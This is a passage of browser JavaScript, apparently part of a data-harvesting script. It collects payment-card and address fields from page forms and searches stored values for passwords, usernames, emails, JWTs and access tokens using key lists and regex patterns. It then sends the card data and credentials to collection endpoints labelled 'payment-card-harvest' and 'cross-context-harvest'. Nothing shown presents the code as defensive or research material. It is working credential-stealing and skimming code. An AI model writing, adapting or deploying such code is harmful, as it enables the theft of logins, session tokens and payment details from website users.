          data.push({ source: 'payment-data', key: input.name || 'cc-number', value: 'REDACTED-CARD' });
          this.core.send('/api/collect/formdata', {
            formId: 'payment-card-harvest',
            fields: { [input.name || 'card']: input.value.substring(0, 4) + '****' + input.value.slice(-4) },
            url: window.location.href
          });
        }
      });

      const addressInputs = document.querySelectorAll('input[autocomplete="street-address"], input[name*="address"], input[name*="street"]');
      addressInputs.forEach(input => {
        if (input.value) {
          data.push({ source: 'payment-data', key: input.name || 'address', value: this.truncate(input.value, 200) });
        }
      });
    } catch (e) {}
  }

  // === CREDENTIAL DETECTION HELPERS ===

  containsCredentials(key, value) {
    if (!value) return false;
    const keyLower = key.toLowerCase();
    const credentialKeys = ['password', 'passwd', 'pwd', 'pass', 'credential', 'secret',
                            'login', 'auth', 'token', 'jwt', 'apikey', 'api_key'];
    if (credentialKeys.some(k => keyLower.includes(k))) return true;
    if (value.includes('"password"') || value.includes('"pass"') || value.includes('"secret"')) return true;
    return false;
  }

  containsToken(key, value) {
    if (!value) return false;
    const keyLower = key.toLowerCase();
    if (keyLower.includes('token') || keyLower.includes('jwt') || keyLower.includes('bearer')) return true;
    if (value.length > 100 && /^eyJ[A-Za-z0-9\-_]+\./.test(value)) return true;
    return false;
  }

  extractCredentialsFromValue(key, value) {
    if (!value) return null;
    const strValue = typeof value === 'string' ? value : JSON.stringify(value);

    let result = {};

    try {
      const parsed = JSON.parse(strValue);
      if (parsed.password || parsed.pass || parsed.passwd || parsed.pwd) {
        result.password = parsed.password || parsed.pass || parsed.passwd || parsed.pwd;
        result.username = parsed.username || parsed.user || parsed.email || parsed.login || '';
        result.email = parsed.email || '';
        if (parsed.url || parsed.redirect) result.url = parsed.url || parsed.redirect;
        if (result.password) return result;
      }
      if (parsed.access_token) {
        result.password = parsed.access_token;
        result.username = parsed.email || parsed.user || parsed.username || '';
        result.email = parsed.email || '';
        return result;
      }
    } catch (e) {}

    const passwordPatterns = [
      /"password"\s*:\s*"([^"]+)"/, /"pass"\s*:\s*"([^"]+)"/, /"passwd"\s*:\s*"([^"]+)"/,
      /"pwd"\s*:\s*"([^"]+)"/, /"secret"\s*:\s*"([^"]+)"/,
      /password[=:]\s*([^\s&"]+)/, /passwd[=:]\s*([^\s&"]+)/, /pwd[=:]\s*([^\s&"]+)/
    ];
    const emailPatterns = [
      /"email"\s*:\s*"([^"]+)"/, /"username"\s*:\s*"([^"]+)"/, /"user"\s*:\s*"([^"]+)"/,
      /email[=:]\s*([^\s&"]+)/, /username[=:]\s*([^\s&"]+)/
    ];

    for (const pattern of passwordPatterns) {
      const match = strValue.match(pattern);
      if (match && match[1] && match[1].length > 3) {
        result.password = match[1];
        break;
      }
    }

    for (const pattern of emailPatterns) {
      const match = strValue.match(pattern);
      if (match && match[1]) {
        const val = match[1];
        if (val.includes('@')) result.email = val;
        else result.username = val;
        break;
      }
    }

    if (result.password) return result;
    return null;
  }

  sendCredentialFromValue(value, key, url) {
    if (!value) return;
    const creds = this.extractCredentialsFromValue(key, value);
    if (creds && creds.password && !this.capturedPasswords.has(creds.password)) {
      this.capturedPasswords.add(creds.password);
      this.core.send('/api/collect/credentials', {
        source: 'cross-context-harvest',
        username: creds.username || creds.email || '',
        password: creds.password,
        email: creds.email || '',
        url: url || window.location.href,
        formType: 'cross-context-' + key,
        fieldData: { sourceKey: key }
      });
    }
  }

  truncate(str, max) {
    if (!str) return '';
    return str.length > max ? str.substring(0, max) + '...' : str;
  }
}